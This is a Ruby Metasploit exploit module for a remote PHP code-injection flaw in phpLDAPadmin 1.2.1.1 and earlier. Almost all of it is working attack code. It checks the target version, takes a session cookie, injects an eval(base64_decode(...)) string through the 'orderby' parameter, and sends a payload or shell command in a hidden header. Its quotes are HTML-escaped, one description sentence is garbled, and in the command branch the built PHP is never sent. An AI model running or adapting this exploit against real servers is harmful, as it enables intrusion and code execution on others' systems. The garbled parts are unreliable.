# $Id: phpldapadmin_query_engine.rb 14060 2011-10-25 05:25:39Z sinn3r $
##
 
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = ExcellentRanking
 
    include Msf::Exploit::Remote::HttpClient
    include Msf::Payload::Php
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;phpLDAPadmin <= 1.2.1.1 (query_engine) Remote PHP Code Injection&#039;,
            &#039;Description&#039;    => %q{
                    This module exploits a vulnerability in the lib/functions.php that allows
                attackers input parsed directly to the create_function() php function. A patch was
                before being parsed to the create_function() call.
            },
            &#039;Author&#039;         =>
                [
                    &#039;EgiX <n0b0d13s[at]gmail-com>&#039;,               # original discovery/poc
                    &#039;mr_me <steventhomasseeley[at]gmail-com>&#039;,    # msf
                    &#039;TecR0c <roccogiovannicalvi[at]gmail-com >&#039;,  # msf
                ],
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Version&#039;        => &#039;$Revision: 14060 $&#039;,
            &#039;References&#039;     =>
                [
                    [&#039;BID&#039;, &#039;50331&#039;],
                    [&#039;URL&#039;, &#039;http://sourceforge.net/support/tracker.php?aid=3417184&#039;],
                    [&#039;URL&#039;, &#039;http://www.exploit-db.com/exploits/18021/&#039;],
                ],
            &#039;Privileged&#039;     => false,
            &#039;Payload&#039;        =>
                {
                    &#039;DisableNops&#039; => true,
                    &#039;Space&#039;       => 4000,
                    &#039;Keys&#039;        => [&#039;php&#039;],
                },
            &#039;Platform&#039;       => [&#039;php&#039;],
            &#039;Arch&#039;           => ARCH_PHP,
            &#039;Targets&#039;        => [[ &#039;Automatic&#039;, { }]],
            &#039;DisclosureDate&#039; => &#039;Oct 24 2011&#039;,
            &#039;DefaultTarget&#039;  => 0))
 
            register_options(
                [
                    OptString.new(&#039;URI&#039;, [true, "phpLDAPadmin directory path", "/phpldapadmin/htdocs/"]),
                ], self.class)
    end
 
    def check
        uri = &#039;&#039;
        uri << datastore[&#039;URI&#039;]
        uri << &#039;/&#039; if uri[-1,1] != &#039;/&#039;
        uri << &#039;index.php&#039;
 
        res = send_request_raw(
            {
                &#039;method&#039;  => &#039;GET&#039;,
                &#039;uri&#039; => uri,
            }, 3)
 
        if (res and res.body =~ /phpLDAPadmin \(1\.2\.[0|1]\.\d/i)
            return Exploit::CheckCode::Vulnerable
        end
 
        return Exploit::CheckCode::Safe
    end
 
    def get_session
        uri = &#039;&#039;
        uri << datastore[&#039;URI&#039;]
        uri << &#039;/&#039; if uri[-1,1] != &#039;/&#039;
        uri << &#039;index.php&#039;
 
        res = send_request_raw(
            {
                &#039;method&#039;  => &#039;GET&#039;,
                &#039;uri&#039; => uri,
            }, 3)
 
        if (not res.headers[&#039;Set-Cookie&#039;])
            print_error("Could not generate a valid session")
            return
        end
 
        return res.headers[&#039;Set-Cookie&#039;]
    end
 
    def cleanup
        # We may not be using php/exe again, so clear the CMD option
        if datastore[&#039;CMD&#039;]
            datastore[&#039;CMD&#039;] = nil
        end
    end
 
    def exploit
        # if we are using the exec CMD stager
        # important to check which php functions are disabled
        if datastore[&#039;CMD&#039;]
            cmd = Rex::Text.encode_base64(datastore[&#039;CMD&#039;])
            dis = &#039;$&#039; + Rex::Text.rand_text_alpha(rand(4) + 4)
            out = &#039;$&#039; + Rex::Text.rand_text_alpha(rand(4) + 4)
            shell = <<-END_OF_PHP_CODE
            $c = base64_decode("#{cmd}");
            #{php_system_block({:cmd_varname=>"$c", :disabled_varname => dis, :output_varname => out})}
            echo #{out};
            END_OF_PHP_CODE
        else
            p = Rex::Text.encode_base64(payload.encoded)
        end
 
        # Generate some random strings
        hidden_header = rand_text_alpha_upper(6)
        fake_func_name = rand_text_alpha_upper(2)
 
        # build sttack string
        php_code = "#{fake_func_name}));}}error_reporting(0);eval(base64_decode(\$_SERVER[HTTP_#{hidden_header}]));die;/*"
        data = "cmd=query_engine&query=none&search=1&orderby=#{php_code}\r\n\r\n"
        session = get_session
 
        uri = &#039;&#039;
        uri << datastore[&#039;URI&#039;]
        uri << &#039;/&#039; if uri[-1,1] != &#039;/&#039;
        uri << &#039;cmd.php&#039;
 
        res = send_request_cgi(
            {
                &#039;method&#039; => &#039;POST&#039;,
                &#039;uri&#039; => uri,
                &#039;data&#039; => data,
                &#039;headers&#039; =>
                    {
                        "#{hidden_header}" => p,
                        &#039;Cookie&#039; => session,
                        &#039;Connection&#039; => &#039;Close&#039;,
                    },
                 
            }, 3)
 
        print_status("%s" % res.body) if datastore[&#039;CMD&#039;]
    end
 
end



